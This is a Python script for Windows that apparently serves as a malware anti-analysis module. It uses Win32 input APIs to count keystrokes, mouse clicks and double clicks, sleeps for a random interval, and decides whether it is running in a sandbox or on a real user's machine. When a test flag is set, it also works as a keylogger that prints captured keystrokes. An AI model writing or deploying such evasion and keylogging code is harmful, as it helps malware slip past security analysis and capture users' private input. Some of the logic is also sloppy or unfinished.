#!/usr/bin/env python3
import ctypes
import msvcrt
import win32api
import random
import time
import sys
import vk_keys

vk = vk_keys.VK_Keys()
# Only looking for printable or interesting key presses
key_list = [0x01] + list(range(32, 127)) + list(vk.id_to_vk.keys())

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

keystrokes = 0
mouse_clicks = 0
double_clicks = 0

verbose = True
test = False  # Set to True to run test for key presses (keylogger)


class Last_Input_Info(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint),
                ("dwTime", ctypes.c_ulong)]


def vprint(verbose_string, lverbose=False):
    global verbose
    if lverbose or verbose:
        if lverbose:
            icon = lverbose
        else:
            icon = '*'
        print('[{}] {}'.format(icon, verbose_string), flush=True)


def get_last_input():
    global time_reported

    struct_last_input_info = Last_Input_Info()
    struct_last_input_info.cbSize = ctypes.sizeof(Last_Input_Info)

    # Get last registered input
    user32.GetLastInputInfo(ctypes.byref(struct_last_input_info))

    # Determine how long the machine has been running
    run_time = kernel32.GetTickCount()
    elapsed = run_time - struct_last_input_info.dwTime

    return elapsed


def get_key_press(last_key=None, key_list=key_list):
    '''
    -Returns the virtual key value if "listed"
    -Otherwise returns the string representation of the
    key that was pressed
    '''
    global mouse_clicks
    global keystrokes

    for key in key_list:
        key = int(key)
        key_state = win32api.GetAsyncKeyState(key)
        if key_state != 0:
            if key_state < 0 and key == 0x01 and key != last_key:
                mouse_clicks += 1
                return 0x01
            elif key_state < 0 and key != last_key:
                keystrokes += 1
                return key
            elif key_state < 0 and key == last_key:
                return key
            return None


def detect_sandbox():
    '''
    Looks for mouse clicks, double clicks, and keystrokes to determine if
    this is a user machine or a sandbox environment
    '''
    global mouse_clicks
    global keystrokes

    random_sleep_time = random.randint(7,70)  # Patience
    time.sleep(random_sleep_time)

    max_keystrokes = random.randint(12, 24)
    max_mouse_clicks = random.randint(7, 24)

    double_clicks = 0
    max_double_clicks = random.randint(3, 7)
    double_click_threshold = 0.24  # seconds
    sec_wait = .12  # Key pause threshold
    first_double_click = None

    max_input_threshold = 32000  # miliseconds

    previous_timestamp = None
    previous_keypress = None

    while True:
        keypress = get_key_press(last_key=previous_keypress)
        keypress_time = time.time()
        last_input = get_last_input()

        # Check if threshold hit and quit
        if last_input >= max_input_threshold:
            return True
        elif (keypress is None or
                (keypress == previous_keypress and keypress != 0x01)):
            time.sleep(sec_wait)
        elif keypress is not None:
            # Calculate the time between for double clicks
            if previous_timestamp and keypress_time:
                elapsed = keypress_time - previous_timestamp
            else:
                keypress_time = time.time()
                elapsed = 0

            # Double click found
            if ((keypress == 0x01 or keypress == 0x01) and
                    elapsed < double_click_threshold and
                    elapsed > sec_wait and
                    keypress == previous_keypress):
                double_clicks += 1

                if first_double_click is None:
                    # Grab the timestamp of the first click
                    first_double_click = time.time()
                else:
                    if double_clicks >= max_double_clicks:
                        t_since_dbl_clk = keypress_time - first_double_click
                        clk_limit = max_double_clicks * double_click_threshold
                        if t_since_dbl_clk <= clk_limit:
                            return True

            previous_keypress = keypress
            previous_timestamp = keypress_time
            time.sleep(sec_wait)

        # Last checks for thresholds
        if (keystrokes >= max_keystrokes and
                double_clicks >= max_double_clicks and
                mouse_clicks >= max_mouse_clicks):
            return False


def main(**args):
    '''
    Turns this into a keylogger to see if keys are being caught correctly
    '''
    if test:
        # Build starting foundation for tracking key strokes.
        last_key = None  # Key for previous or the last key press
        new_key = None   # Key for current key press
        idle_sec = 0

        # Repeat key threshold
        repeat_time = 70  # Used for checking if key was presssed repeatedly

        while idle_sec < 3:  # Run until input stops for a few seconds
            try:
                idle = get_last_input()
                idle_sec = idle / 1000

                new_key = get_key_press(last_key=last_key)

                # Handle duplicate key inputs by using delay
                if new_key == last_key and last_key is not None:

                    if idle > repeat_time:
                        last_key = None

                    # Sleep while duplicate keys (may miss keys)
                    time.sleep(.07)

                # Handle new key input
                else:
                    if new_key is not None:
                        last_key = new_key

                        # Key press print out.
                        if new_key >= 32 and new_key < 127:
                            key = chr(new_key)
                        else:
                            key = vk.get_vk(new_key)

                        print('{}'.format(key), end='', flush=True)

            except RuntimeWarning as rwe:
                pass
        vprint('\n------------\n')
        vprint('Done Testing')
        vprint('Mouse clicks: {}'.format(mouse_clicks))
        vprint('Keystrokes: {}'.format(keystrokes))


def run(**args):
    if 'test' in args and args['test'] is True:
        return 'Sandbox detect could be running'
    if 'time_delay' in args:
        time_delay = args['time_delay']


if __name__ == '__main__':
    if test:
        main(test=test)  # run key logger
    else:
        if detect_sandbox():
            print('Sandbox checks failed.')
        else:
            print('We are ok!')